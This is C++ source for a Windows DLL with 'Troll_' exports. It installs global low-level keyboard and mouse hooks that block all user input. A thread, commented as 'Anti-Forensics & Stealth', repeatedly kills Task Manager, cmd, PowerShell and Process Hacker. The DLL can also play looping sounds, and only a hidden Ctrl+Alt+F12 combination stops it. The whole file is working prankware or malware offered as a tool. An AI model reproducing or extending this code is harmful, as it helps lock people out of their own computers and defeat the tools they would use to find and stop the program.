// clang-format off
#include <windows.h>
#include <tlhelp32.h>
#include <mmsystem.h>
#include <string.h>
// clang-format on

#pragma comment(lib, "Winmm.lib")

HHOOK hKeyboardHook = NULL;
HHOOK hMouseHook = NULL;
volatile bool killSwitchActive = false;
volatile bool blockInputs = false;

// État interne des modifiers (tracké manuellement car le hook bloque la
// livraison OS)
volatile bool internalCtrlDown = false;
volatile bool internalAltDown = false;

// 1. PROCESS REAPER (Anti-Forensics & Stealth)
void KillProcessByName(const char *name) {
  HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (hSnap != INVALID_HANDLE_VALUE) {
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnap, &pe32)) {
      do {
        if (_stricmp(pe32.szExeFile, name) == 0) {
          HANDLE hProc =
              OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
          if (hProc) {
            TerminateProcess(hProc, 0);
            CloseHandle(hProc);
          }
        }
      } while (Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
  }
}

DWORD WINAPI ReaperThread(LPVOID lpParam) {
  while (!killSwitchActive) {
    KillProcessByName("taskmgr.exe");
    KillProcessByName("cmd.exe");
    KillProcessByName("powershell.exe");
    KillProcessByName("ProcessHacker.exe");
    Sleep(100);
  }
  return 0;
}

// 2. ABSOLUTE INPUT HOOKS (Kill Switch intégré, tracking MANUEL des modifiers)
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0) {
    KBDLLHOOKSTRUCT *kb = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vk = kb->vkCode;

    // ── Tracking manuel de l'état ctrl/alt ──
    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
      if (vk == VK_LCONTROL || vk == VK_RCONTROL)
        internalCtrlDown = true;
      if (vk == VK_LMENU || vk == VK_RMENU)
        internalAltDown = true;

      // ── KILL SWITCH: Ctrl + Alt + F12 ──
      if (vk == VK_F12 && internalCtrlDown && internalAltDown) {
        killSwitchActive = true;
        PostQuitMessage(0);
        return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
      }
    }
    if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
      if (vk == VK_LCONTROL || vk == VK_RCONTROL)
        internalCtrlDown = false;
      if (vk == VK_LMENU || vk == VK_RMENU)
        internalAltDown = false;
    }

    // ── Blocage d'input (sauf si Kill Switch activé) ──
    if (blockInputs && !killSwitchActive) {
      return 1;
    }
  }
  return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
  if (nCode >= 0 && blockInputs && !killSwitchActive) {
    return 1;
  }
  return CallNextHookEx(hMouseHook, nCode, wParam, lParam);
}

DWORD WINAPI HookThread(LPVOID lpParam) {
  hKeyboardHook =
      SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
  hMouseHook =
      SetWindowsHookEx(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);

  MSG msg;
  while (!killSwitchActive && GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }

  if (hKeyboardHook)
    UnhookWindowsHookEx(hKeyboardHook);
  if (hMouseHook)
    UnhookWindowsHookEx(hMouseHook);
  return 0;
}

extern "C" {
__declspec(dllexport) void Troll_Init() {
  CreateThread(NULL, 0, HookThread, NULL, 0, NULL);
  CreateThread(NULL, 0, ReaperThread, NULL, 0, NULL);
}

__declspec(dllexport) int Troll_IsKilled() { return killSwitchActive ? 1 : 0; }

__declspec(dllexport) void Troll_SetInputBlock(int block) {
  blockInputs = (block != 0);
}

__declspec(dllexport) void Troll_PlaySound(const char *filePath, int loop) {
  DWORD flags = SND_FILENAME | SND_ASYNC;
  if (loop)
    flags |= SND_LOOP;
  PlaySoundA(filePath, NULL, flags);
}

__declspec(dllexport) void Troll_StopSound() { PlaySoundA(NULL, NULL, 0); }
}
